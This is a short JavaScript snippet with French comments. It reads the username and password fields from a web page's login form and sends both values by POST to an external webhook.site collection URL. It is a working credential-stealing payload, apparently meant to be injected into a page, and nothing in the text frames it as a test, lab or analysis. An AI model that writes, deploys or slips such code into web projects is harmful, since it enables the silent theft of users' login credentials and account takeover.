// Récupérer les informations des champs de formulaire
const usernameField = document.querySelector('input[name="username"]');
const passwordField = document.querySelector('input[name="password"]');

const username = usernameField ? usernameField.value : '';
const password = passwordField ? passwordField.value : '';

// URL de votre serveur pour recevoir les données
const serverUrl = 'https://webhook.site/a3d6d9f6-4141-47bd-a203-441b22ec5126';

// Envoyer les données au serveur
fetch(serverUrl, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    username: username,
    password: password
  })
}).then(response => response.text()).then(data => {
  console.log('Données envoyées au serveur:', data);
}).catch(error => {
  console.error('Erreur lors de l\'envoi des données:', error);
});
